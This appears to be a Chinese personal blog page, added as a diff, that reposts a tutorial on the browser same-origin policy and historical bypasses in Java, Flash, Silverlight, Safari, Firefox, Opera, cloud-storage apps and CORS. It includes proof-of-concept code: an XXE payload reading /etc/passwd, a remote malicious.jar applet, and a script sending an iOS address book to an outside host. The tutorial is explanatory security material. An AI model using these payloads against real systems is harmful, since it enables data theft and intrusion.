@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      同源策略详解及绕过(转) | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="0x01 同源策略最近CTF中一直出现同源策略的绕过以及XSS绕过CSP等题目，搞得我完全懵逼，什么也不会，于是才打算这几天静下心来闭关修炼几天。所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(javascript、ActionScript)在没明确授权的情况下，不能读写对方的资源。简单的来说，浏览器允许包含在页面A的脚本访问第二个页面B的数据资源，这一切是建立在A和B页面是同源的基础上。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="同源策略详解及绕过(转) | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2016/12/13/同源策略详解及绕过-转/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="0x01 同源策略最近CTF中一直出现同源策略的绕过以及XSS绕过CSP等题目，搞得我完全懵逼，什么也不会，于是才打算这几天静下心来闭关修炼几天。所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(javascript、ActionScript)在没明确授权的情况下，不能读写对方的资源。简单的来说，浏览器允许包含在页面A的脚本访问第二个页面B的数据资源，这一切是建立在A和B页面是同源的基础上。">
+<meta property="og:updated_time" content="2016-12-13T12:15:03.664Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="同源策略详解及绕过(转) | Hello,C">
+<meta name="twitter:description" content="0x01 同源策略最近CTF中一直出现同源策略的绕过以及XSS绕过CSP等题目，搞得我完全懵逼，什么也不会，于是才打算这几天静下心来闭关修炼几天。所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(javascript、ActionScript)在没明确授权的情况下，不能读写对方的资源。简单的来说，浏览器允许包含在页面A的脚本访问第二个页面B的数据资源，这一切是建立在A和B页面是同源的基础上。">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">同源策略详解及绕过(转)</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-12-13" class="post-meta__date date">2016-12-13</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="0x01-同源策略"><a href="#0x01-同源策略" class="headerlink" title="0x01 同源策略"></a>0x01 同源策略</h3><p><strong>最近CTF中一直出现同源策略的绕过以及XSS绕过CSP等题目，搞得我完全懵逼，什么也不会，于是才打算这几天静下心来闭关修炼几天。</strong><br>所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(javascript、ActionScript)在没明确授权的情况下，不能读写对方的资源。<br>简单的来说，浏览器允许包含在页面A的脚本访问第二个页面B的数据资源，这一切是建立在A和B页面是同源的基础上。<br>假设你已经成功登录Gmail服务器，同时在同一个浏览器访问恶意站点（另一个浏览器选项卡）。没有同源策略，攻击者可以通过JavaScript获取你的邮件以及其他敏感信息，比如说阅读你的私密邮件，发送虚假邮件，看你的聊天记录等等。<br>将Gmail替换为你的银行帐户，问题就大条了。<br><a id="more"></a></p>
+<h3 id="0x02-常见同源策略以及绕过"><a href="#0x02-常见同源策略以及绕过" class="headerlink" title="0x02 常见同源策略以及绕过"></a>0x02 常见同源策略以及绕过</h3><h4 id="SOP和DOM：同源策略与文档对象模型"><a href="#SOP和DOM：同源策略与文档对象模型" class="headerlink" title="SOP和DOM：同源策略与文档对象模型"></a>SOP和DOM：同源策略与文档对象模型</h4><p>当我们谈论如何使用JavaScript访问DOM时，我们考虑了URL的三个要素（主机名 + 访问协议 + 端口号）<br>如果不止一个站点拥有相同的主机名、访问协议、端口号，那么他是能够成功访问到DOM的。然而，IE仅仅只是验证主机名以及访问协议，忽略了端口号。</p>
+<p>在大多数情况下，多个站点可能在同一根域（获取源页面的DOM）。</p>
+<p>例如，cart.httpsecure.org需要访问login.httpsecure.org来进行身份验证。在这种情况下，网站可以使用document.domain属性允许相同域下的其他站点进行DOM交互。如果你允许cart.httpsecure.org与login.httpsecure.org进行交互，开发者需要在两个站点的根域设置document.domain属性。</p>
+<pre><code>document.domain = “httpsecure.org”
+</code></pre><p>这表示在当前页面，httpsecure.org下的任何站点都可以访问DOM资源。当你这样设置后，你应该时刻保持警惕！比如说你部署在网络上的另一个站点about.httpsecure.org，假设这个站点存在漏洞，那么cart.httpsecure.org这个站点也可能存在漏洞并且可以访问这个源。</p>
+<p>如果攻击者能够上传一些恶意代码，那么about.httpsecure.org也会获得访问其他站点的权限。</p>
+<h4 id="SOP和CORS：同源策略与跨源资源共享"><a href="#SOP和CORS：同源策略与跨源资源共享" class="headerlink" title="SOP和CORS：同源策略与跨源资源共享"></a>SOP和CORS：同源策略与跨源资源共享</h4><p>跨源资源共享（CORS）是一种允许多种资源（图片，Css，字体，JavaScript等）在一个web页面请求域之外的另一个域的资源的机制。</p>
+<p>使用XMLHttpRequest对象发起HTTP请求就必须遵守同源策略。具体而言，Web应用程序能且只能使用XMLHttpRequest对象向其加载的源域名发起HTTP请求，而不能向任何其它域名发起请求。跨源资源共享这种机制让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。</p>
+<p>如果httpsecure.org源返回下面的响应头，所有httpsecure.org的子域与根域就打开了一个双向的通信通道:</p>
+<pre><code>Access-Control-Allow-Origin: *.Httpsecure.org
+Access-Control-Allow-Methods: OPTIONS, GET, POST, HEAD, PUT
+Access-Control-Allow-Headers: X-custom
+Access-Control-Allow-Credentials: true
+</code></pre><p>在上面的响应头中，第一行定义了双向通信通道，第二行定义了请求可以使用OPTIONS, GET, POST, PUT, HEAD中的任何方式，第三行则是定义的响应头，最后一行允许经过身份验证的资源进行通信。  </p>
+<h4 id="SOP与plugins：同源策略与插件"><a href="#SOP与plugins：同源策略与插件" class="headerlink" title="SOP与plugins：同源策略与插件"></a>SOP与plugins：同源策略与插件</h4><p><strong>注释：如果在httpsecure.org:80安装插件，那么只能允许插件访问httpsecure.org:80</strong></p>
+<p>由于不同的绕过方法，在Java，Adobe Reader，Flash，Silverlight中实现同源策略是十分痛苦的。大多数浏览器都使用他们自己的方式实现同源策略，如果处在同一个IP地址，一些Java版本会认为两个不同的域名应用同一个同源策略。这对于虚拟主机环境（多个域名使用同一个IP）来说可能是一个毁灭性的灾难。</p>
+<p>谈论Flash player以及PDF reader插件，他们都有一个悠久的漏洞历史。这些漏洞大多数都是允许攻击者远程执行任意代码，这远比同源策略绕过更可怕！</p>
+<p>在Flash中，你可以通过crossdomain.xml管理跨源通信，该文件一般在根目录下</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;cross-domain-policy&gt;
+&lt;site-control permitted-cross-domain-policies=&quot;by-content-type&quot;/&gt;
+&lt;allow-access-from domain=&quot;*.httpsecure.org&quot; /&gt;
+&lt;/cross-domain-policy&gt;
+</code></pre><p>使用这段代码的httpsecure.org子域可以实现站点的双向通信，Crossdomain.xml还支持Java以及JavaScript插件。</p>
+<h4 id="SOP与UI-redressing：同源策略与界面伪装"><a href="#SOP与UI-redressing：同源策略与界面伪装" class="headerlink" title="SOP与UI redressing：同源策略与界面伪装"></a>SOP与UI redressing：同源策略与界面伪装</h4><p>点击劫持（clickjacking）是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段。该术语最早由雷米亚·格罗斯曼（Jeremiah Grossman）与罗伯特·汉森（Robert Hansen）于2008年提出。这种行为又被称为界面伪装（UI redressing）。对于攻击者同源策略绕过，方法各有不同。事实上一部分攻击还是利用同源策略没有执行。</p>
+<h4 id="Java同源策略绕过"><a href="#Java同源策略绕过" class="headerlink" title="Java同源策略绕过"></a>Java同源策略绕过</h4><p>在Java1.7u17版本和1.6u45版本中，如果两个主机名解析到同一个IP地址，那么就不会执行同源策略（Httpsecure.org和 httpssecure.com解析到同一个IP地址）。Java applet（是一种在Web环境下，运行于客户端的Java程序组件，每个Applet的功能都比较单一）可以解决跨院请求和读取响应信息。</p>
+<p>在Java6和Java7版本，如果两个主机名解析到同一个IP地址，那么会被认定为两个主机是相同的。</p>
+<p>在Java同源策略中实现这种类型的漏洞，那会十分恐怖。特别是对于虚拟主机（多个域名解析到同一个IP地址）来说，那将是毁灭性的灾难。</p>
+<p>最重要的是，通过applet使用BufferedReader和InputStreamReader对象考虑有关的权限需要。在Java1.6不需要运行applet实现用户交互，在1.7版本就不同了。现在用户必须使用点击播放特性(click to play feature)运行有签名和没有签名的applet，这个特性可以使用IMMUNITY来绕过并且导致了后来的CVE-2011-3546（在Java中同源策略绕过）。类似的在Adobe reader也发现了同源策略绕过。</p>
+<pre><code>&lt;applet
+code=&quot;malicious.class&quot;
+archive=&quot;http://httpsecure.org?redirect_to=
+
+http://securityhacking123.com/malicious.jar&quot;
+
+width=&quot;100&quot; height=&quot;100&quot;&gt;
+&lt;/applet&gt;
+</code></pre><h4 id="Adobe-Reader同源策略绕过"><a href="#Adobe-Reader同源策略绕过" class="headerlink" title="Adobe Reader同源策略绕过"></a>Adobe Reader同源策略绕过</h4><p>Adobe Reader在浏览器插件中存在许多的安全问题，其大部分漏洞都是由于溢出问题导致的任意代码执行漏洞。在Adobe Reader PDF中可以使用JavaScript，正是这个原因，所以有很多恶意软件将代码隐藏在PDF文件之中。</p>
+<p>CVE-2013-0622通过未明向量，远程攻击者利用该漏洞绕过预期的访问限制。</p>
+<p>如果我们谈论到XXE Injection，这涉及到试图注入恶意负载到请求中，输入如下：</p>
+<pre><code>&lt;!DOCTYPE bar &gt;
+&lt;!ELEMENT bar ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot; &gt;]&gt;&lt;bar&gt;&amp;xxe;&lt;/bar&gt;
+</code></pre><p>&amp;XXE的值取而代之的是/etc/passwd，这项技术可以被用到同源策略绕过，它会加载XE并且服务器会返回一个302重定向响应。</p>
+<h4 id="Adobe-Flash同源策略绕过"><a href="#Adobe-Flash同源策略绕过" class="headerlink" title="Adobe Flash同源策略绕过"></a>Adobe Flash同源策略绕过</h4><p>Adobe Flash使用crossdomain.xml文件控制Flash接收数据。我们可以在该文件中添加限制，只信任添加在内的站点。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;cross-domain-policy&gt;
+&lt;site-control permitted-cross-domain-policies=&quot;by-content-type&quot;/&gt;
+&lt;allow-access-from domain=&quot;*&quot; /&gt;
+&lt;/cross-domain-policy&gt;
+</code></pre><p>通过设置allow-access-from属性的域，您可以允许访问来自任何域的文档。</p>
+<h4 id="Silverlight同源策略绕过"><a href="#Silverlight同源策略绕过" class="headerlink" title="Silverlight同源策略绕过"></a>Silverlight同源策略绕过</h4><p>Silverlight是微软推出的一款插件，其与Flash使用相同的同源策略。然而，其使用的clientaccess-policy.xml代码如下所示：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;access-policy&gt;
+&lt;cross-domain-access&gt;
+&lt;policy&gt;
+&lt;allow-from&gt;
+&lt;domain uri=&quot;*&quot;/&gt;
+&lt;/allow-from&gt;
+&lt;grant-to&gt;
+&lt;resource path=&quot;/&quot; include-subpaths=&quot;true&quot;/&gt;
+&lt;/grant-to&gt;
+&lt;/policy&gt;
+&lt;/cross-domain-access&gt;
+&lt;/access-policy&gt;
+</code></pre><p>请记住Silverlight与Flash是不同的，如Silverlight没有隔离基于协议和端口的不同源的访问，而Flash就会隔离。所以在Silverlight中 <a href="https://Httpsecure.org" target="_blank" rel="external">https://Httpsecure.org</a>  和 <a href="http://Httpsecure.org" target="_blank" rel="external">http://Httpsecure.org</a>  会被认为是同源。</p>
+<h4 id="Internet-Explorer同源策略绕过"><a href="#Internet-Explorer同源策略绕过" class="headerlink" title="Internet Explorer同源策略绕过"></a>Internet Explorer同源策略绕过</h4><p>Internet Explorer8以及前面的版本很容易通过document.domain实现同源策略绕过，通过重写文档对象，域属性这个问题可以十分轻松的被利用。</p>
+<pre><code>var document;
+document = {};
+document.domain = ‘httpsecure.org&apos;;
+alert(document.domain);
+</code></pre><p>如果你在最新的浏览器中运行这段代码，可能在JavaScript控制台会显示一个同源策略绕过错误。</p>
+<h4 id="Safari同源策略绕过"><a href="#Safari同源策略绕过" class="headerlink" title="Safari同源策略绕过"></a>Safari同源策略绕过</h4><p>为了帮助大家更好的理解，<a href="http://httpsecure.org" target="_blank" rel="external">http://httpsecure.org</a> 和file://httpsecure 都视为不同源，Safari浏览器(IOS以及MAC)6.0.2版本当需要访问本地资源时不执行同源策略。尝试使用file协议打开一个HTML文件，包含在文件内的JavaScript代码可以绕过同源策略。</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt; I&apos;m a local file loaded using the file:// scheme &lt;/h1&gt;
+&lt;script&gt;
+xhr = new XMLHttpRequest(); xhr.onreadystatechange = function (){ if (xhr.readyState == 4) { alert(xhr.responseText);
+}
+}; xhr.open(&quot;GET&quot;, &quot;http://httpsecure.org/docs/safari_sameoriginpolicy_bypassing/other_origin.html&quot;); xhr.send();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>现在页面使用file协议进行加载，执行上面的请求之后，XMLHTTPRequest对象仍然能够获得响应信息。</p>
+<h4 id="Firefox同源策略绕过"><a href="#Firefox同源策略绕过" class="headerlink" title="Firefox同源策略绕过"></a>Firefox同源策略绕过</h4><p>Firefox是最常见的浏览器，这个同源策略绕过是2012年10月份Gareth Heyes发现。这个问题存在于Firefox16中脱离同源策略的限制，导致未经授权访问window.location对象。</p>
+<p>绕过代码如下：</p>
+<pre><code>&lt;!Doctype html&gt;
+&lt;script&gt;
+function poc() {
+var win = window.open(&apos;https://httpsecure.org/abc/&apos;, &apos;newWin&apos;,
+&apos;width=200,height=200&apos;);
+setTimeout(function(){
+alert(&apos;Hello &apos;+/^https:\/\/httpsecure.org\/([^/]+)/.exec(
+win.location)[1])
+}, 5000);
+}
+&lt;/script&gt;
+&lt;input type=button value=&quot;Firefox knows&quot; onclick=&quot;poc()&quot;&gt;
+</code></pre><p>在一个你操控的源上执行上面的代码，浏览器会弹出另一个选项卡进行HTTPS验证。加载httpsecure.org/abc以及重定向到 <a href="https://httpsecure.org/" target="_blank" rel="external">https://httpsecure.org/</a> <user_uid>/lists（user_uid是你的httpsecure handle）。5秒钟之后，exec函数将触发window.location对象解析正则表达式，这会导致在警告框中显示httpsecure handle。</user_uid></p>
+<p>2012年8月，当火狐发布支持HTML5沙盒iframe的版本时，布朗发现当把沙盒iframe的属性设置为allow-script，来自iframe的虚假JavaScript仍然可以访问window.top，这将会改变外部的window.location。</p>
+<pre><code>&lt;!-- Outer file, bearing the sandbox --&gt;
+&lt;iframe src=&quot;inner.html&quot; sandbox=&quot;allow-scripts&quot;&gt;&lt;/iframe&gt;
+框架代码：
+
+&lt;!-- Framed document , inner.html --&gt;
+&lt;script &gt;
+// escape sandbox:
+if(top != window) { top.location = window.location; }
+// all following JavaScript code and markup is unrestricted:
+// plugins, popups and forms allowed.
+&lt;/script&gt;
+</code></pre><p>这段代码需要指定额外的allow-top-navigation代码，允许JavaScript加载一个iframe改变窗口位置，攻击者可以使用它重定向目标用户到指定的恶意网站。</p>
+<p>注意：在HTML5，新出现了一个叫做沙盒的iframe属性，这个新属性的关注点在于拥有一个更科学更安全的方式使用iframe。</p>
+<h4 id="Opera同源策略绕过"><a href="#Opera同源策略绕过" class="headerlink" title="Opera同源策略绕过"></a>Opera同源策略绕过</h4><p>这个同源策略绕过是由Heyes发现的，当覆盖函数或者创建一个location对象的iframe，Opera没有正确执行同源策略。</p>
+<p>让我们看下面的代码示例：</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;iframe id=&quot;ifr&quot; src=&quot;http://httpsecure.org/xdomain.html&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+var iframe = document.getElementById(&apos;ifr&apos;);
+function do_something(){
+var iframe = document.getElementById(&apos;ifr&apos;);
+iframe.contentWindow.location.constructor.
+prototype.     defineGetter__.constructor(&apos;[].constructor. prototype.join=function(){console.log(&quot;pwned&quot;)}&apos;)();
+}
+setTimeout(&quot;do_something()&quot;,3000);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>下面是来自不同源的框架内容：</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;b&gt;I will be framed from a different origin&lt;/b&gt;
+&lt;script&gt;
+function do_join(){ [1,2,3].join();
+console.log(&quot;join() after prototype override: &quot;
++ [].constructor.prototype.join);
+}
+console.log(&quot;join() after prototype override: &quot;
++ [].constructor.prototype.join);
+setTimeout(&quot;do_join();&quot;, 5000);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>在上述框架代码，当在数组中调用join()，就会使用constructor.prototype.join原生代码值。几秒钟之后， [1,2,3]数组调用join()，如果你对上面的代码有一个清晰的认识，那么你肯定看到join()被do_something()覆盖。</p>
+<p>实际情况中，这个绕过也是有局限性的，只能在某些安全防护较低的站点使用。</p>
+<p>举个例子，我们在Opera浏览器中打开两个选项卡，其中一个选项卡是已经被攻下的页面，另外一个是身份验证页面。如果你在身份验证页面源里面创建一个iframe包含src标签，你就可以浏览到iframe框架内的所以内容了。</p>
+<h4 id="云存储中同源策略绕过"><a href="#云存储中同源策略绕过" class="headerlink" title="云存储中同源策略绕过"></a>云存储中同源策略绕过</h4><p>如果你认为同源策略绕过只存在在Web浏览器以及一些插件那就错了，云存储服务器也是存在同源策略绕过的。DROPBOX 1.4.6（iOS），DROPBOX 2.01（Android）和Google Drive 1.0.1(iOS)，这些都提供用户将文件存储到云端。Roi Saltzman发现了一个类似于Safari的同源策略绕过。这个绕过依赖于在高权限区域加载一个文件。</p>
+<p>File://var/mobile/application/app_uuid</p>
+<p>如果攻击者通过客户端欺骗用户加载一个HTML文件，包含在该文件中的JavaScript就会自动执行。这种攻击方式，需要满足JavaScript能够获取移动设备的本地文件系统。</p>
+<p>仅供参考：如果HTML使用file协议进行加载，就无法组织JavaScript获取其他文件了。</p>
+<p>file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb</p>
+<p>上述链接中包含的AddressBook为iOS用户的联系人信息，如果目标应用不允许进行外部访问，你还可以对缓存进行检索。</p>
+<p>如果用户访问这个恶意链接，用户的联系人信息就会被发送到httpsecure.org.</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+local_xhr = new XMLHttpRequest();
+local_xhr.open(&quot;GET&quot;, &quot;file:///var/mobile/Library/AddressBook/
+150 Chapter 4 ■ Bypassing the Same Origin Policy
+AddressBook.sqlitedb&quot;); local_xhr.send(); local_xhr.onreadystatechange = function () { if (local_xhr.readyState == 4) {
+remote_xhr = new XMLHttpRequest(); remote_xhr.onreadystatechange = function () {}; remote_xhr.open(&quot;GET&quot;, &quot;http://httpsecure.org/?f=&quot; + encodeURI(local_xhr.responseText)); remote_xhr.send();
+}
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h4 id="跨源资源共享-CORS-中的同源策略绕过"><a href="#跨源资源共享-CORS-中的同源策略绕过" class="headerlink" title="跨源资源共享(CORS)中的同源策略绕过"></a>跨源资源共享(CORS)中的同源策略绕过</h4><p>CORS也存在同源策略绕过，CORS中的Access-Control-Allow-Origin: *可能存在着错误设置。</p>
+<p>上面的代码中就存在一个潜在的设置错误，据某机构统计表明有大概100万应用存在这Access-Control-Allow-Origin: *头设置错误。这就意味着允许任何互联网中的应用向这个站点提交一个交叉源请求，并获取返回响应。</p>
+<p><strong>转自：<a href="http://www.freebuf.com/articles/web/65468.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/65468.html</a></strong></p>
+
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2016/12/13/同源策略详解及绕过-转/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
